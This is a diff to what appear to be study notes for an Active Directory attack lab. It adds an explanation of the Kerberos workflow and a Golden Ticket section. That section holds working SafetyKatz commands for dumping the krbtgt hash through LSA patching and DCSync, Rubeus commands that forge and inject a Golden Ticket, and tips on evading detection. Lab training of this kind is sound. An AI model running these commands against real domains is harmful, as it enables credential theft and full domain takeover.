@@ -11,10 +11,9 @@ How we can Run/Load Powershell scripts
 ```
 . C:\AD\Tools\PowerView.ps1
 ```
-
 * A module (or a script) can be imported with:
 ```
-Import-Module C:\AD\Tools\ADModulemaster\ActiveDirectory\ActiveDirectory.psd1
+Import-Module C:\ProgramData\PowerView.ps1
 ```
 
 * All the commands in a module can be listed with: 
@@ -67,6 +66,10 @@ Mainly focus on tool **Invisi-Shell**
 
 ```
 https://github.com/OmerYa/Invisi-Shell
+```
+
+```
+C:\AD\Tools\InviShell\
 ```
 
 * With admin privileges:
@@ -652,4 +655,140 @@ privileges are required to run DCSync.
 * There is much more to Active Directory than "just" the Domain Admin.
 * Once we have DA privileges new avenues of persistence, escalation to EA and attacks across trust open up!
 * Let's have a look at abusing trust within domain, across domains and forests and various attacks on Kerberos.
+
+# Kerberos
+
+* Kerberos is the basis of authentication in a Windows Active Directory environment.
+* Clients (programs on behalf of a user) need to obtain tickets from Key Distribution Center (KDC) which is a service running on the domain controller. These tickets represent the client's credentials.!
+* Therefore, Kerberos is understandably a very interesting target of abuse!
+
+
+## Workflow of Kerberos
+
+```
+                        +-----------------+
+                        |   KDC / DC      |
++----------+            |  (AS & TGS)     |             +--------------+
+|  Client  |            +-----------------+             | App Server   |
+|  (C)     |                     |                      |     (S)      |
++----------+                     |                      +--------------+
+     |                           |                              |
+     |  1. AS-REQ (Username)     |                              |
+     +-------------------------->|                              |
+     |                           |                              |
+     |<--------------------------+                              |
+     |  2. AS-REP (TGT, K_c_tgs) |                              |
+     |                           |                              |
+     |                           |                              |
+     |  3. TGS-REQ (TGT, Auth)   |                              |
+     +-------------------------->|                              |
+     |                           |                              |
+     |<--------------------------+                              |
+     |  4. TGS-REP (Service Ticket, K_c_s)                      |
+     |                           |                              |
+     |                           |                              |
+     |                                                          |
+     |  5. AP-REQ (Service Ticket, Auth)                        |
+     +--------------------------------------------------------->|
+     |                                                          |
+  (Access Granted!)
+  
+```
+
+
+## Explanation of Each step :
+
+#### **Step 1: AS‑REQ (Authentication Service Request)**
+The process starts when a user logs in. The client sends an **AS‑REQ** to the **Key Distribution Center (KDC)** asking for authentication. The request includes the **username** and a timestamp, and (in normal cases) proof that the user knows their password (pre‑authentication).  
+**Why:** The KDC must confirm the user’s identity without the password ever being sent over the network.
+
+#### **Step 2: AS‑REP (Authentication Service Response)**
+If the credentials are valid, the KDC responds with an **AS‑REP** containing two important things:
+
+1. A **Ticket Granting Ticket (TGT)** (encrypted with the KDC’s `krbtgt` key)
+2. A **session key** (encrypted with a key derived from the user’s password)
+
+The client can decrypt the session key using their password, but **cannot read the TGT**.  
+**Why:** The TGT proves the user is authenticated and can be reused to request services without re‑entering the password.
+
+#### **Step 3: TGS‑REQ (Ticket Granting Service Request)**
+When the user wants to access a service (file server, SQL, WinRM, etc.), the client sends a **TGS‑REQ** to the KDC. This request includes the **TGT** and the name of the target service (SPN).  
+**Why:** Instead of authenticating again, the user proves their identity using the TGT to request access to a specific service.
+
+#### **Step 4: TGS‑REP (Ticket Granting Service Response)**
+The KDC validates the TGT and responds with a **TGS‑REP**, which contains:
+
+1. A **service ticket** (encrypted with the service account’s password hash)
+2. A **service session key**
+
+The client still cannot read the service ticket, but can use it.  
+**Why:** Only the target service should be able to decrypt the ticket and trust the authentication.
+
+#### **Step 5: Client → Service (Service Authentication)**
+The client sends the **service ticket** directly to the target server. The server decrypts it using its own password hash, verifies the client’s identity, and establishes a secure session using the shared session key.  
+**Why:** This final step allows **password‑less, secure access** to services and supports **mutual authentication**.
+
+
+## Why krbtgt Must Be Reset Twice
+
+- AD keeps **current + previous krbtgt key**
+- One reset → old key still valid
+- Two resets → fully invalidates forged TGTs
+
+
+
+
+# Golden Ticket
+
+* A golden ticket is signed and encrypted by the hash of krbtgt account which makes it a valid TGT ticket.
+* The krbtgt user hash could be used to impersonate any user with any privileges from even a non-domain machine.
+* As a good practice, it is recommended to change the password of the krbtgt account twice as password history is maintained for the account.
+
+* Execute mimikatz (or a variant) on DC as DA to get krbtgt hash
+```
+C:\AD\Tools\SafetyKatz.exe '"lsadump::lsa /patch"'
+```
+
+*  To use the DCSync feature for getting AES keys for krbtgt account. Use the below command with DA privileges (or a user that has replication rights on the domain object):
+```
+C:\AD\Tools\SafetyKatz.exe "lsadump::dcsync /user:dcorp\krbtgt" "exit"
+```
+
+⚠️ Using the DCSync option needs no code execution on the target DC 
+## Golden Ticket - Rubeus
+
+* Use Rubeus to forge a Golden ticket with attributes similar to a normal TGT:
+```
+C:\AD\Tools\Rubeus.exe golden /aes256:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /sid:S-1-5-21-719815819-3726368948-3917688648 /ldap /user:Administrator /printcmd
+```
+
+*  Above command generates the ticket forging command. Note that 3 LDAP queries are sent to the DC to retrieve the values:
+1. To retrieve flags for user specified in /user.
+2. To retrieve /groups, /pgid, /minpassage and /maxpassage
+3. To retrieve /netbios of the current domain
+* If you have already enumerated the above values, manually specify as many you can in the forging command (a bit more opsec friendly).
+
+* The Golden ticket forging command looks like this:
+```
+C:\AD\Tools\Rubeus.exe golden /aes256:154CB6624B1D859F7080A6615ADC488F09F92843879B3D914CBCB5A8C3CDA848 /user:Administrator /id:500 /pgid:513 /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /pwdlastset:"11/11/2022 6:33:55 AM" /minpassage:1 /logoncount:2453 /netbios:dcorp /groups:544,512,520,513 /dc:DCORP-DC.dollarcorp.moneycorp.local /uac:NORMAL_ACCOUNT,DONT_EXPIRE_PASSWORD
+/ptt
+```
+
+| golden                                                                       | Name of the module                                                                      |
+| ---------------------------------------------------------------------------- | --------------------------------------------------------------------------------------- |
+| /aes256:154CB6624B1D859F7080A6615ADC488F09F<br>92843879B3D914CBCB5A8C3CDA848 | AES256 keys of the krbtgt account. Using AES keys makes the<br>attack more silent.      |
+| /user:Administrator                                                          | Username for which the TGT is generated                                                 |
+| /id:500                                                                      | User RID (retrieved from the DC) (Default 500)                                          |
+| /pgid:513                                                                    | Primary Group ID (retrieved from the DC) (Default 513)                                  |
+| /groups:544,512,520,513                                                      | Groups the user is a member of (retrieved from the DC)<br>(Default 520,512,513,519,518) |
+| /domain:dollarcorp.moneycorp.local                                           | FQDN of the domain (retrieved from the DC)                                              |
+| /sid:S-1-5-21-719815819-3726368948-3917688648                                | SID of the current domain                                                               |
+| /pwdlastset:"11/11/2022 6:33:55 AM"                                          | The PasswordLastSet for the user (retrieved from the DC)                                |
+| /minpassage:1                                                                | “Minimum Password Age” in days (retrieved from the DC)                                  |
+| /logoncount:2453                                                             | Logon Count for the user (retrieved from the DC)                                        |
+| /netbios:dcorp                                                               | NetBIOS name of the domain (retrieved from the DC)                                      |
+| /dc:DCORP-DC.dollarcorp.moneycorp.local                                      | FQDN of the DC (retrieved from the DC)                                                  |
+| /uac:NORMAL_ACCOUNT,DONT_EXPIRE_PASSWORD                                     | UserAccountControl Flags (retrieved from the DC)                                        |
+| /ptt                                                                         | Inject in the current process                                                           |
+
 
